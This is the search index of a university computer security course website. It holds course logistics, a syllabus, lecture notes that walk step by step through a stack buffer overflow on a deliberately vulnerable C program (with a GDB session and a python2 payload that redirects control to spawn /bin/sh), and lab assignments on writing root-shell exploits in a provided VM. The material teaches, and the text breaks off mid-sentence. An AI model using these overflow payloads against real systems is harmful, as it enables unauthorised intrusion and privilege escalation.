{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"This course focuses on computer security, covering a wide range of topics on both the \"defensive\" and \"offensive\" side of this field. Among these will be systems security and exploitation (buffer overflows, race conditions, SQL injection, etc), access control and authentication, covert channels, network security, language-based security, denial-of-service, privacy and anonymity. The goal of the course is to provide an appreciation of how to think adversarially with respect to computer systems as well as an appreciation of how to reason about attacks and defenses. To complete the projects in this course, you will need the ability to develop software programs using the C language, and some understanding of x86 assembly, JavaScript, PHP and SQL. We will not reach these in class and you will be expected to learn them on your own. If you don't know C, K&R's The C Programming Language is a great go to, but the Hacking book is probably enough and covers some x86 assembly too. Class details \u00b6 Lectures: Mondays and Wednesdays, 5pm - 6:20pm in CENTR 109 Section: Fridays, 2pm-2:50pm in CENTR 216 Piazza: https://piazza.com/ucsd/winter2020/cse127/home Gradescope https://www.gradescope.com/courses/79259 Access Code: 9J8GW6 Textbook \u00b6 We will occasionally be assinging readings from Ross Anderson's Security Engineering and various other online resources and papers. We may also assign optional reading from Jon Erickson's Hacking: The Art of Exploitation . Grading \u00b6 40% Assignments 25% Midterm exam 35% Final exam \u226410% Participation in class and online Programming assignments \u00b6 We will have assignments that are meant to both reinforce your knowledge of the concepts covered in lecture and get you to think about security in more depth, beyond what is covered lecture. You are expected to work on the assignments by yourself. You may discuss the assignments with students from the course, in general, but not any specific solution. There are no late days, but you will receive an additional 10% if you turn in your assignment by the early date. If you consult anything (books, academic papers, internet resources, people not in your group) when working on the assignments, note this in your submission. We encourage outside learning but expect you to not seek out specific details about a solution -- anything submitted should be considered your own work. Similarly, you are expected to not publish or otherwise share your solutions at any point (even after the class is over). If you are unsure about what is allowed, please ask the course staff. Exams \u00b6 The midterm is closed-book , but you may use a double-sided cheat sheet (letter-size). The final is closed-book , but you may use 2 double-sided cheat sheets (letter-size). The exams will make up 60% of your grade. Since the final is cumulative your midterm grade will be calculated as: midterm > 0 ? max(final, midterm) : 0 This means that (1) you basically get a second chance if you don't so well on the midterm and (2) you must show up to both the midterm and the final. If you need to miss either exam because of a documented medical emergency, contact the instructor immediately. Participation/pre-lecture readings \u00b6 Before each class there will be some assigned reading. You are expected to do the reading and have at least a vague understanding of the concepts that will be discussed in class. This will allow us to spend the lecture time to solidify your understanding. Asking and answering questions in class, on Piazza, or during office hours counts towards your class participation. Contributing to the class lecture notes will similarly be rewarded with extra points. Acknowledgements \u00b6 The course structure and many of the ideas and slides are influenced or directly from other courses taught at Berkeley ( David Wagner and Raluca Popa ), Oberlin ( Stephen Checkoway ), Stanford ( Dan Boneh , John Mitchell , and Zakir Durumeric ), UT Austin ( Hovav Shacham ), UCSD ( Stefan Savage , Nadia Heninger ) and UIUC ( Kirill Levchenko ). (If we're missing anybody please let us know!) Academic integrity and student conduct \u00b6 By taking this course, you implicitly agree to abide by the UCSD policies on Integrity of Scholarship and Student Conduct . University rules on integrity of scholarship and code of conduct are taken seriously and will be enforced.","title":"About"},{"location":"#class-details","text":"Lectures: Mondays and Wednesdays, 5pm - 6:20pm in CENTR 109 Section: Fridays, 2pm-2:50pm in CENTR 216 Piazza: https://piazza.com/ucsd/winter2020/cse127/home Gradescope https://www.gradescope.com/courses/79259 Access Code: 9J8GW6","title":"Class details"},{"location":"#textbook","text":"We will occasionally be assinging readings from Ross Anderson's Security Engineering and various other online resources and papers. We may also assign optional reading from Jon Erickson's Hacking: The Art of Exploitation .","title":"Textbook"},{"location":"#grading","text":"40% Assignments 25% Midterm exam 35% Final exam \u226410% Participation in class and online","title":"Grading"},{"location":"#programming-assignments","text":"We will have assignments that are meant to both reinforce your knowledge of the concepts covered in lecture and get you to think about security in more depth, beyond what is covered lecture. You are expected to work on the assignments by yourself. You may discuss the assignments with students from the course, in general, but not any specific solution. There are no late days, but you will receive an additional 10% if you turn in your assignment by the early date. If you consult anything (books, academic papers, internet resources, people not in your group) when working on the assignments, note this in your submission. We encourage outside learning but expect you to not seek out specific details about a solution -- anything submitted should be considered your own work. Similarly, you are expected to not publish or otherwise share your solutions at any point (even after the class is over). If you are unsure about what is allowed, please ask the course staff.","title":"Programming assignments"},{"location":"#exams","text":"The midterm is closed-book , but you may use a double-sided cheat sheet (letter-size). The final is closed-book , but you may use 2 double-sided cheat sheets (letter-size). The exams will make up 60% of your grade. Since the final is cumulative your midterm grade will be calculated as: midterm > 0 ? max(final, midterm) : 0 This means that (1) you basically get a second chance if you don't so well on the midterm and (2) you must show up to both the midterm and the final. If you need to miss either exam because of a documented medical emergency, contact the instructor immediately.","title":"Exams"},{"location":"#participationpre-lecture-readings","text":"Before each class there will be some assigned reading. You are expected to do the reading and have at least a vague understanding of the concepts that will be discussed in class. This will allow us to spend the lecture time to solidify your understanding. Asking and answering questions in class, on Piazza, or during office hours counts towards your class participation. Contributing to the class lecture notes will similarly be rewarded with extra points.","title":"Participation/pre-lecture readings"},{"location":"#acknowledgements","text":"The course structure and many of the ideas and slides are influenced or directly from other courses taught at Berkeley ( David Wagner and Raluca Popa ), Oberlin ( Stephen Checkoway ), Stanford ( Dan Boneh , John Mitchell , and Zakir Durumeric ), UT Austin ( Hovav Shacham ), UCSD ( Stefan Savage , Nadia Heninger ) and UIUC ( Kirill Levchenko ). (If we're missing anybody please let us know!)","title":"Acknowledgements"},{"location":"#academic-integrity-and-student-conduct","text":"By taking this course, you implicitly agree to abide by the UCSD policies on Integrity of Scholarship and Student Conduct . University rules on integrity of scholarship and code of conduct are taken seriously and will be enforced.","title":"Academic integrity and student conduct"},{"location":"contact/","text":"For general information and questions, please post to the class Piazza . It's very likely that other students will have the same question. We will post announcements on Piazza, so please make sure to sign up. For urgent or personal matters, please post a private question. Instructor \u00b6 Name: Deian Stefan Email: deian+cse127@cs.ucsd.edu Address: 3126 EBU3B Office Hours: Wednesday 3:00-4:00pm in 3126 EBU3B Teaching Assistants \u00b6 Name: Sunjay Cauligi Office Hours: Tuesday 4:00-5:00pm in B215 EBU3B Name: Riley Hadden Office Hours: Thursday 8:00-9:00am in B275 EBU3B Name: Zaki Siddiqui Office Hours: Monday 1:00-2:00pm in B270A EBU3B","title":"Contact Info and Office Hours"},{"location":"contact/#instructor","text":"Name: Deian Stefan Email: deian+cse127@cs.ucsd.edu Address: 3126 EBU3B Office Hours: Wednesday 3:00-4:00pm in 3126 EBU3B","title":"Instructor"},{"location":"contact/#teaching-assistants","text":"Name: Sunjay Cauligi Office Hours: Tuesday 4:00-5:00pm in B215 EBU3B Name: Riley Hadden Office Hours: Thursday 8:00-9:00am in B275 EBU3B Name: Zaki Siddiqui Office Hours: Monday 1:00-2:00pm in B270A EBU3B","title":"Teaching Assistants"},{"location":"syllabus/","text":"Date Topics Jan 6 Intro/Threat Modeling Optional reading: James Mickens' This World of Ours and USENIX Security 2018 Keynote Assignment 1: Intro Jan 8 Buffer overflow attacks Reading: Aleph One's Smashing the Stack for Fun and Profit Optional reading: 0x300-0x320 from Hacking. 0x200-0x270 if you don't have a strong C background. Jan 13 Buffer overflow defenses (Stack canaries/W^X/ASLR) Reading: Eternal War in Memory by Szekeres et al., ASLR , and NOEXEC Assignment 2: Buffer overflows Jan 15 More memory safety attacks and defenses Reading: The Geometry of Innocent Flesh on the Bone:Return-into-libc without Function Calls (on the x86) by Shacham and Control-Flow Integrity by Abadi et al. Jan 20 Martin Luther King, Jr. Holiday Jan 22 More memory safety attacks and defenses (cont) Jan 27 Isolation and side channels Reading: Efficient Cache Attacks on AES, and Countermeasures by Tromer, Osvik, and Shamir. Assignment 3: Side channels Jan 29 Web security model Feb 3 Web attacks and defenses Assignment 4: Web Feb 5 Modern client-side web defenses Feb 10 Midterm review Feb 12 Midterm Feb 17 Presidents' Day Holiday Feb 19 Network intro Assignment 5: Networks Feb 24 Network attacks Feb 26 Network defenses Mar 2 Symmetric-key crypto Mar 5 Public-key crypto Reading: Bleichenbacher's RSA signature forgery based on implementation error by Finney Assignment 6: Crypto Mar 9 TLS/PKI Mar 11 Privacy/Anonymity/Ethics/Policy","title":"Syllabus"},{"location":"notes/bufferoverflow/","text":"We're going to walk through the example from class, carrying out a simple stack buffer overflow attack. To get started, create a file called example2.c with the example code: #include <stdio.h> #include <stdlib.h> #include <string.h> void bar () { system ( \"/bin/sh\" ); } void foo () { printf ( \"hello all!! \\n \" ); exit ( 0 ); } void func ( int a , int b , char * str ) { int c = 0xdeadbeef ; char buf [ 4 ]; strcpy ( buf , str ); } int main ( int argc , char ** argv ) { func ( 0xaaaaaaaa , 0xbbbbbbbb , argv [ 1 ]); return 0 ; } Then compile the program with GCC: gcc -m32 -O0 -ggdb -static -U_FORTIFY_SOURCE -fno-stack-protector -zexecstack -no-pie -o example2 example2.c You'll note that we compiled this program with a bunch of flags. These flags disable many protection mechanism that would make such an attack harder to carry out. We'll see in class what most of these are. Code and environment inspection \u00b6 Our first goal is to manually modify the stack frames to change the return address in fun to jump (when it returns) to the beginning of foo , instead of returning back to main . To get started, let's start GDB: $ gdb example2 Within GDB let's set a breakpoint on func and run the program with argument \"AAAA\" : > b func > set args \"AAAA\" > r To figure out where to jump to, let's first look at the what's on the stack frame: Recall that the first argument is off by 8: > x $ebp+8 0xffffced0: 0xaaaaaaaa The second argument is at offset 12: > x $ebp+12 0xffffced4: 0xbbbbbbbb The old $ebp is at offset 0: > x $ebp 0xffffcec8: 0xffffcee8 If our function returns normally, the $ebp will be set to 0xffffcee8 . If you want to see this, set a breakpoint right after the strcpy ( b 17 ), continue ( c in GDB) and then step through ( s ). You can also stop at the exact leave instruction by setting a break point at the address: > b *0x8049c1e You can find such addresses with disas : > disas func Dump of assembler code for function func: 0x08049bee <+0>: push %ebp 0x08049bef <+1>: mov %esp,%ebp 0x08049bf1 <+3>: push %ebx 0x08049bf2 <+4>: sub $0x14,%esp 0x08049bf5 <+7>: call 0x8049c68 <__x86.get_pc_thunk.ax> 0x08049bfa <+12>: add $0x96406,%eax 0x08049bff <+17>: movl $0xdeadbeef,-0xc(%ebp) 0x08049c06 <+24>: sub $0x8,%esp 0x08049c09 <+27>: pushl 0x10(%ebp) 0x08049c0c <+30>: lea -0x10(%ebp),%edx 0x08049c0f <+33>: push %edx 0x08049c10 <+34>: mov %eax,%ebx 0x08049c12 <+36>: call 0x8049028 0x08049c17 <+41>: add $0x10,%esp 0x08049c1a <+44>: nop 0x08049c1b <+45>: mov -0x4(%ebp),%ebx 0x08049c1e <+48>: leave 0x08049c1f <+49>: ret End of assembler dump. NOTE: This address will likely be different on your machine. Where is the return address? It's 4 off the $ebp : > x $ebp+4 0xffffcecc: 0x08049c58 Now what is this 0x08049c58 value? It's the address in main right after the call to func ( which is at address 0x8039bee ): > disas main Dump of assembler code for function main: 0x08049c20 <+0>: lea 0x4(%esp),%ecx ... 0x08049c53 <+51>: call 0x8049bee <func> 0x08049c58 <+56>: add $0x10,%esp ... End of assembler dump. Great. Now to to direct the control flow to foo instead of back to main we just need to overwrite the return address. We can do this by setting $ebp+4 : We can do this by getting foo 's address: > p &foo $2 = (void (*)()) 0x8049bc0 <foo> > set {int}($ebp+4)=0x8049bc0 Or more simply: > set {int}($ebp+4)=&foo Now if you continue ( c ) the ret will jump to 0x8049bc0 and print: hello all!! As an attacker, we need to overflow the buffer to write the return address though. We can't attach GDB to a process we don't control. Overflowing the buffer \u00b6 So, let's overflow the buffer. To see the effects of the overflow make sure you set the breakpoint after strcpy and let's change the args to go just past buf 4-byte boundary: > b 17 > set args > set args \"AAAABC\" > r If you print the local variable c before and after the strcpy you'll see that we've overflow from buf into c : > p c $14 = 0xdeadbeef > c > p c $15 = 0xde004342 You'll notice that c changed from 0xdeadbeef to 0xde004242 , i.e., 0xde\"\\0CB\" . If we then change the args to \"AAAABCD\" you'll see that c = 0x00444342 . But we need to overflow the return address. How do we figure out how much we need to overflow? Compute the distance between the return address and buffer start. In func : > p $ebp+4-&buf[0] $16 = 0x14 This means that we need to supply an arugment that is 20 bytes long (0x14) to get up to the return address. Let's do that: > set args \"AAAABBBBCCCCDDDDEEEEFFFF\" > r Now if you inspect the contents of the return addresss (after strcpy ) you'll see it filled with all F s: > x $ebp+4 0xffffcebc: 0x46464646 If you let this program continue it will crash with: Cannot access memory at address 0x46464646 Why? We'll we're trying to read the instruction at address 0x46464646 to execute it. That's not a valid address. Let's instead point the program to foo ( 0x8049bc0 ): > set args $(python2 -c \"print 'AAAABBBBCCCCDDDDEEEE\\xc0\\x9b\\x04\\x08'\") > r Now if you run the program it will print hello all . We can do all of this from the shell: $ ./example2 ` python2 -c \"print 'AAAABBBBCCCCDDDDEEEE\\xc0\\x9b\\x04\\x08'\" ` hello all!! In practice you'll want to get a shell. In our example we can get a shell by setting the return address to bar : > p &bar $35 = (void (*)()) 0x8049b95 <bar> > set args $(python2 -c \"print 'AAAABBBBCCCCDDDDEEEE\\x95\\x9b\\x04\\x08'\") > r sh-5.0$ Realistically you won't have a nice function like bar in the process and you'll need to essentially mock a call to system yourself. You can do this by overflowing the buffer with your (shell) code and have the return address point to your code instead of existing functions. You'll get to do this in one of you assignments! GEF \u00b6 You may find GEF helpful throught the quarter. I like ATT synax for x86: set disassembly-flavor att and like the stack growing downwards to match slides ( gef config context.grow_stack_down True ).","title":"Stack smashing"},{"location":"notes/bufferoverflow/#code-and-environment-inspection","text":"Our first goal is to manually modify the stack frames to change the return address in fun to jump (when it returns) to the beginning of foo , instead of returning back to main . To get started, let's start GDB: $ gdb example2 Within GDB let's set a breakpoint on func and run the program with argument \"AAAA\" : > b func > set args \"AAAA\" > r To figure out where to jump to, let's first look at the what's on the stack frame: Recall that the first argument is off by 8: > x $ebp+8 0xffffced0: 0xaaaaaaaa The second argument is at offset 12: > x $ebp+12 0xffffced4: 0xbbbbbbbb The old $ebp is at offset 0: > x $ebp 0xffffcec8: 0xffffcee8 If our function returns normally, the $ebp will be set to 0xffffcee8 . If you want to see this, set a breakpoint right after the strcpy ( b 17 ), continue ( c in GDB) and then step through ( s ). You can also stop at the exact leave instruction by setting a break point at the address: > b *0x8049c1e You can find such addresses with disas : > disas func Dump of assembler code for function func: 0x08049bee <+0>: push %ebp 0x08049bef <+1>: mov %esp,%ebp 0x08049bf1 <+3>: push %ebx 0x08049bf2 <+4>: sub $0x14,%esp 0x08049bf5 <+7>: call 0x8049c68 <__x86.get_pc_thunk.ax> 0x08049bfa <+12>: add $0x96406,%eax 0x08049bff <+17>: movl $0xdeadbeef,-0xc(%ebp) 0x08049c06 <+24>: sub $0x8,%esp 0x08049c09 <+27>: pushl 0x10(%ebp) 0x08049c0c <+30>: lea -0x10(%ebp),%edx 0x08049c0f <+33>: push %edx 0x08049c10 <+34>: mov %eax,%ebx 0x08049c12 <+36>: call 0x8049028 0x08049c17 <+41>: add $0x10,%esp 0x08049c1a <+44>: nop 0x08049c1b <+45>: mov -0x4(%ebp),%ebx 0x08049c1e <+48>: leave 0x08049c1f <+49>: ret End of assembler dump. NOTE: This address will likely be different on your machine. Where is the return address? It's 4 off the $ebp : > x $ebp+4 0xffffcecc: 0x08049c58 Now what is this 0x08049c58 value? It's the address in main right after the call to func ( which is at address 0x8039bee ): > disas main Dump of assembler code for function main: 0x08049c20 <+0>: lea 0x4(%esp),%ecx ... 0x08049c53 <+51>: call 0x8049bee <func> 0x08049c58 <+56>: add $0x10,%esp ... End of assembler dump. Great. Now to to direct the control flow to foo instead of back to main we just need to overwrite the return address. We can do this by setting $ebp+4 : We can do this by getting foo 's address: > p &foo $2 = (void (*)()) 0x8049bc0 <foo> > set {int}($ebp+4)=0x8049bc0 Or more simply: > set {int}($ebp+4)=&foo Now if you continue ( c ) the ret will jump to 0x8049bc0 and print: hello all!! As an attacker, we need to overflow the buffer to write the return address though. We can't attach GDB to a process we don't control.","title":"Code and environment inspection"},{"location":"notes/bufferoverflow/#overflowing-the-buffer","text":"So, let's overflow the buffer. To see the effects of the overflow make sure you set the breakpoint after strcpy and let's change the args to go just past buf 4-byte boundary: > b 17 > set args > set args \"AAAABC\" > r If you print the local variable c before and after the strcpy you'll see that we've overflow from buf into c : > p c $14 = 0xdeadbeef > c > p c $15 = 0xde004342 You'll notice that c changed from 0xdeadbeef to 0xde004242 , i.e., 0xde\"\\0CB\" . If we then change the args to \"AAAABCD\" you'll see that c = 0x00444342 . But we need to overflow the return address. How do we figure out how much we need to overflow? Compute the distance between the return address and buffer start. In func : > p $ebp+4-&buf[0] $16 = 0x14 This means that we need to supply an arugment that is 20 bytes long (0x14) to get up to the return address. Let's do that: > set args \"AAAABBBBCCCCDDDDEEEEFFFF\" > r Now if you inspect the contents of the return addresss (after strcpy ) you'll see it filled with all F s: > x $ebp+4 0xffffcebc: 0x46464646 If you let this program continue it will crash with: Cannot access memory at address 0x46464646 Why? We'll we're trying to read the instruction at address 0x46464646 to execute it. That's not a valid address. Let's instead point the program to foo ( 0x8049bc0 ): > set args $(python2 -c \"print 'AAAABBBBCCCCDDDDEEEE\\xc0\\x9b\\x04\\x08'\") > r Now if you run the program it will print hello all . We can do all of this from the shell: $ ./example2 ` python2 -c \"print 'AAAABBBBCCCCDDDDEEEE\\xc0\\x9b\\x04\\x08'\" ` hello all!! In practice you'll want to get a shell. In our example we can get a shell by setting the return address to bar : > p &bar $35 = (void (*)()) 0x8049b95 <bar> > set args $(python2 -c \"print 'AAAABBBBCCCCDDDDEEEE\\x95\\x9b\\x04\\x08'\") > r sh-5.0$ Realistically you won't have a nice function like bar in the process and you'll need to essentially mock a call to system yourself. You can do this by overflowing the buffer with your (shell) code and have the return address point to your code instead of existing functions. You'll get to do this in one of you assignments!","title":"Overflowing the buffer"},{"location":"notes/bufferoverflow/#gef","text":"You may find GEF helpful throught the quarter. I like ATT synax for x86: set disassembly-flavor att and like the stack growing downwards to match slides ( gef config context.grow_stack_down True ).","title":"GEF"},{"location":"pa/pa1/","text":"Assignment 1 (20 pts) \u00b6 Deadline: January 15, 2020 by 1:59:59 PM Early Turn-In: Sunday, January 12, 2020 by 11:59:59 PM (10% bonus) The goal of this assignment is to become familiar with the setup that will be used for future assignments, such as the use of a virtual machine and the included turn-in script, as well as the basics of working with gdb and writing programs in x86 assembly. Getting Started \u00b6 To complete this assignment, you will be provided with a VirtualBox VM pre-populated with the assignment files. VM Image \u00b6 In order to match the environment in which your submission will be graded, all work for this assignment must be done on the VirtualBox VM we provide, named pa1box . You can download the VM image here . The VM is configured with two users: student , with password hacktheplanet ; and root , with password hackallthethings . The VM is configured with SSH on port 2222. Please note that SSH is disabled for root , so you can only SSH in as the student user. You can still log in as root using su or by logging into the VM directly. To SSH into the VM: ssh - p 2222 student @127.0.0.1 To copy files from your computer to the VM: scp - P 2222 - r / path / to / files / student @127.0.0.1 :/ home / student To copy files from the VM to your computer: scp - P 2222 student @127.0.0.1 :/ path / to / files / / destination / path Part 1: Using GDB (10 pts) \u00b6 Files for this sub-assignment are located in the gdb subdirectory of the student user's home directory in the VM image; that is, /home/student/gdb . SSH into the VM and cd into that directory to begin working on it. Inside the gdb directory, you'll find fib.c , a C program demonstrating the Fibonacci sequence; a Makefile ; and hw1.txt , in which you'll record your responses to the questions below. The first step is to compile fib by running make on the command line. To run the fib executable in GDB, run gdb fib . I recommend the following workflow in GDB: Starting. Set breakpoints that you can later use for analysis: b foo \u2014 break at function foo b *0x08048489 \u2014 break at the instruction at address 0x08048489 r \u2014 run the executable Analyzing. Examine memory, registers, etc; disassemble code; show stack frames, backtrace, etc; and more: disas foo \u2014 disassemble function foo i r \u2014 view registers where \u2014 view stack frames x <loc> \u2014 examine memory x $eip \u2014 examine current instruction pointer x /10x $esp \u2014 examine 10 words at top of stack x /10x buf \u2014 examine 10 words in buf x /10i $eip \u2014 examine 10 instructions starting at instruction pointer x /10i foo \u2014 examine 10 instructions starting at foo Continuing. Continue analysis: c \u2014 continue execution until next breakpoint/watchpoint si \u2014 step to the next instruction s \u2014 step to the next line of source code Note that this is only a cursory overview of GDB; much more info is available from online resources. Assignment Instructions \u00b6 Complete the following exercises and fill out hw1.txt with your answers. Follow the directions in the template, do not delete the square brackets What is the value, in hex, of the ecx register when the function f is called? (2 pts) Which register stores the value of the variable i in the function main? (2 pts) What is the address, in hex, of the function f ? (2 pts) What is the name of the 6th instruction of the function f ? (2 pts) When f completes after being called from main , to which address in main does control return? Write your answer in hex form. (2 pts) Submission \u00b6 Submit hw1.txt to \"1a. gdb\" on Gradescope. Gradescope will check that it has successfully detected your answers, but it will not give you your grade until the due date. Part 2: echo in x86 (10 pts) \u00b6 Files for this sub-assignment are located in the x86 subdirectory of the student user's home directory in the VM image; that is, /home/student/x86 . SSH into the VM and cd into that directory to begin working on it. For this part, you will be implementing a simplified version of the familiar echo command, using raw x86 assembly code. The goal of this assignment is to familiarize you with writing programs directly in x86. Your echo command must behave as follows: When run with a single command line argument (e.g., ./echo Hello ): Prints that argument back to the console's standard output (stdout). Prints a trailing newline ( \\n ). Exits with code 0. When run with too few command line arguments (e.g., ./echo ) or too many (e.g., ./echo Hello World ): Prints exactly the error message This command expects exactly one argument. \u2014 followed by a trailing newline ( \\n ) \u2014 to the console's standard error (stderr). Exits with code 1. Your code should be written in the file echo.s inside the x86 directory. A heavily-commented example echo.s is provided, which simply prints the message Hello World (followed by a trailing newline) to stdout. Your job is to modify this program to meet the specification for echo above. A Makefile is included, so you can build the echo binary by running make from the command line. Helpful Hints \u00b6 In a Linux program, stdout is file descriptor number 1 and stderr is number 2. Linux programs start with argc at the top of the stack, accessible at 0(%esp) from x86-assembly programs. Below it is argv , the array of pointers to (null-terminated) strings passed into the program as arguments. So argv[0] can be accessed from x86-assembly programs at 4(%esp) , argv[1] at 8(%esp) , argv[2] at 12(%esp) , and so on. argv[0] is the name of the program executed, not the first argument, which is argv[1] if supplied (or 8(%esp) for our purposes). Then argc (or 0(%esp) ) will be 1 if the program was not passed any arguments, 2 if it was passed 1 argument, and so on. This table of Linux system calls may come in handy. Submission \u00b6 Submit echo.s to \"1b. x86 echo\" on Gradescope.","title":"Assignment 1"},{"location":"pa/pa1/#assignment-1-20-pts","text":"Deadline: January 15, 2020 by 1:59:59 PM Early Turn-In: Sunday, January 12, 2020 by 11:59:59 PM (10% bonus) The goal of this assignment is to become familiar with the setup that will be used for future assignments, such as the use of a virtual machine and the included turn-in script, as well as the basics of working with gdb and writing programs in x86 assembly.","title":"Assignment 1 (20 pts)"},{"location":"pa/pa1/#getting-started","text":"To complete this assignment, you will be provided with a VirtualBox VM pre-populated with the assignment files.","title":"Getting Started"},{"location":"pa/pa1/#vm-image","text":"In order to match the environment in which your submission will be graded, all work for this assignment must be done on the VirtualBox VM we provide, named pa1box . You can download the VM image here . The VM is configured with two users: student , with password hacktheplanet ; and root , with password hackallthethings . The VM is configured with SSH on port 2222. Please note that SSH is disabled for root , so you can only SSH in as the student user. You can still log in as root using su or by logging into the VM directly. To SSH into the VM: ssh - p 2222 student @127.0.0.1 To copy files from your computer to the VM: scp - P 2222 - r / path / to / files / student @127.0.0.1 :/ home / student To copy files from the VM to your computer: scp - P 2222 student @127.0.0.1 :/ path / to / files / / destination / path","title":"VM Image"},{"location":"pa/pa1/#part-1-using-gdb-10-pts","text":"Files for this sub-assignment are located in the gdb subdirectory of the student user's home directory in the VM image; that is, /home/student/gdb . SSH into the VM and cd into that directory to begin working on it. Inside the gdb directory, you'll find fib.c , a C program demonstrating the Fibonacci sequence; a Makefile ; and hw1.txt , in which you'll record your responses to the questions below. The first step is to compile fib by running make on the command line. To run the fib executable in GDB, run gdb fib . I recommend the following workflow in GDB: Starting. Set breakpoints that you can later use for analysis: b foo \u2014 break at function foo b *0x08048489 \u2014 break at the instruction at address 0x08048489 r \u2014 run the executable Analyzing. Examine memory, registers, etc; disassemble code; show stack frames, backtrace, etc; and more: disas foo \u2014 disassemble function foo i r \u2014 view registers where \u2014 view stack frames x <loc> \u2014 examine memory x $eip \u2014 examine current instruction pointer x /10x $esp \u2014 examine 10 words at top of stack x /10x buf \u2014 examine 10 words in buf x /10i $eip \u2014 examine 10 instructions starting at instruction pointer x /10i foo \u2014 examine 10 instructions starting at foo Continuing. Continue analysis: c \u2014 continue execution until next breakpoint/watchpoint si \u2014 step to the next instruction s \u2014 step to the next line of source code Note that this is only a cursory overview of GDB; much more info is available from online resources.","title":"Part 1: Using GDB (10 pts)"},{"location":"pa/pa1/#assignment-instructions","text":"Complete the following exercises and fill out hw1.txt with your answers. Follow the directions in the template, do not delete the square brackets What is the value, in hex, of the ecx register when the function f is called? (2 pts) Which register stores the value of the variable i in the function main? (2 pts) What is the address, in hex, of the function f ? (2 pts) What is the name of the 6th instruction of the function f ? (2 pts) When f completes after being called from main , to which address in main does control return? Write your answer in hex form. (2 pts)","title":"Assignment Instructions"},{"location":"pa/pa1/#submission","text":"Submit hw1.txt to \"1a. gdb\" on Gradescope. Gradescope will check that it has successfully detected your answers, but it will not give you your grade until the due date.","title":"Submission"},{"location":"pa/pa1/#part-2-echo-in-x86-10-pts","text":"Files for this sub-assignment are located in the x86 subdirectory of the student user's home directory in the VM image; that is, /home/student/x86 . SSH into the VM and cd into that directory to begin working on it. For this part, you will be implementing a simplified version of the familiar echo command, using raw x86 assembly code. The goal of this assignment is to familiarize you with writing programs directly in x86. Your echo command must behave as follows: When run with a single command line argument (e.g., ./echo Hello ): Prints that argument back to the console's standard output (stdout). Prints a trailing newline ( \\n ). Exits with code 0. When run with too few command line arguments (e.g., ./echo ) or too many (e.g., ./echo Hello World ): Prints exactly the error message This command expects exactly one argument. \u2014 followed by a trailing newline ( \\n ) \u2014 to the console's standard error (stderr). Exits with code 1. Your code should be written in the file echo.s inside the x86 directory. A heavily-commented example echo.s is provided, which simply prints the message Hello World (followed by a trailing newline) to stdout. Your job is to modify this program to meet the specification for echo above. A Makefile is included, so you can build the echo binary by running make from the command line.","title":"Part 2: echo in x86 (10 pts)"},{"location":"pa/pa1/#helpful-hints","text":"In a Linux program, stdout is file descriptor number 1 and stderr is number 2. Linux programs start with argc at the top of the stack, accessible at 0(%esp) from x86-assembly programs. Below it is argv , the array of pointers to (null-terminated) strings passed into the program as arguments. So argv[0] can be accessed from x86-assembly programs at 4(%esp) , argv[1] at 8(%esp) , argv[2] at 12(%esp) , and so on. argv[0] is the name of the program executed, not the first argument, which is argv[1] if supplied (or 8(%esp) for our purposes). Then argc (or 0(%esp) ) will be 1 if the program was not passed any arguments, 2 if it was passed 1 argument, and so on. This table of Linux system calls may come in handy.","title":"Helpful Hints"},{"location":"pa/pa1/#submission_1","text":"Submit echo.s to \"1b. x86 echo\" on Gradescope.","title":"Submission"},{"location":"pa/pa2/","text":"Assignment 2 75 pts + 25pts extra for sploit4 \u00b6 Deadline: Wednesday, January 29, 2020 by 1:59:59 PM Early Turn-In: Sunday, January 26, 2020 by 11:59:59 PM (10% bonus) The goal of this assignment is to gain hands-on experience with the effects of buffer overflows and other memory-safety bugs. sploit1-sploit3 are required. sploit4 is extra credit! You will be provided a skeleton for implementing these exploits in C. You must not discuss your solution with other students until three days after the assignment deadline. You may consult any online references you wish. If you use any code in your answer that you did not write yourself, you must document that fact. Failure to do so will be considered a violation of the academic integrity policy. Getting Started \u00b6 To complete this assignment you will be provided with a VirtualBox VM and a set of files. VM Image \u00b6 In order to match the environment in which your submission will be graded, all work for this assignment must be done on the VirtualBox VM we have provided, named pa2box . You can download the VM image here . Import the pa2box.vbox file into VirtualBox via the Machine \u2192 Add menu item. Don't create a brand-new VirtualBox VM or import the pa2box-data.vmdk file on its own: if you do this, you won't have the correct configuration. After importing the VM, select it in the VirtualBox sidebar and start it with the green arrow button or the Machine \u2192 Start menu item. The VM is configured with two users: student , with password hacktheplanet ; and root , with password hackallthethings . Instead of using the command line through VirtualBox, we recommend that you SSH into your VM from another client. The VM image is configured to expose an SSH server on port 2222 of your system's loopback address ( 127.0.0.1 ). To SSH into the VM (from your host system running VirtualBox, not from inside the VM): ssh - p 2222 student @127.0.0.1 To copy files from your computer to the VM: scp - P 2222 - r / path / to / files / student @127.0.0.1 :/ home / student To copy files from the VM to your computer: scp - P 2222 student @127.0.0.1 :/ path / to / files / / destination / path Please note that SSH is disabled for root , so you can only SSH in as the student user. You can still log in as root using su or by logging into the VM directly. Assignment Files \u00b6 Starter files are included inside the student home directory of the VM image. The targets directory contains a Makefile to generate target executables specific to your PID (as well as a folder called base , which you should not modify, used to generate the targets). Exploit starter code can be found in the sploits1 - sploits4 directories: one per each of the four vulnerable target programs. Each of these contains a Makefile , a shellcode.h header file providing Aleph One's shellcode, and a sploitN.c file in which you should write your exploit code (in addition to an assignment.toml file, which should not be modified). You will be writing an exploit for each of the four vulnerable programs provided in the assignment. Each exploit, when run in the VM with its target installed setuid-root in /tmp , should yield a root shell ( /bin/sh ). You can verify that the shell has been launched as root by typing whoami , to which you should see the response root . You must use Aleph One\u2019s shellcode in shellcode.h , as this will be used in the grading scripts. For each exploit, in addition to your .c file, please also create a corresponding file writeup.txt containing a brief description of how the exploit works. Exploit Generation \u00b6 To complete the assignment, you will need to: generate targets specific to your PID; use GDB to find vulnerabilities in the targets; and, finally, craft your exploit programs. Generating the Targets \u00b6 Run make generate in the targets directory to create the four target source files specific to you. This will prompt you for your student ID ( A######## or U######## ), which will be used to randomize portions of the contents of target1.c - target4.c . Run make to build the target binaries target1 - target4 . Run sudo make install to copy the binaries into the /tmp directory. Finally, run sudo make setuid to mark the binaries as setuid-root. If you forget this step, then your exploits will end up launching a normal shell instead of a root shell! Exploit Notes \u00b6 For this assignment you should read and have a solid understanding of Aleph One\u2019s \u201cSmashing the Stack for Fun and Profit\u201d. Aleph One gives code that calculates addresses on the target\u2019s stack based on addresses on the exploit\u2019s stack. However, addresses on the exploit\u2019s stack can change based on how the exploit is executed (working directory, arguments, environment, etc.). You must therefore hard-code target stack locations in your exploits. You should not use a function such as 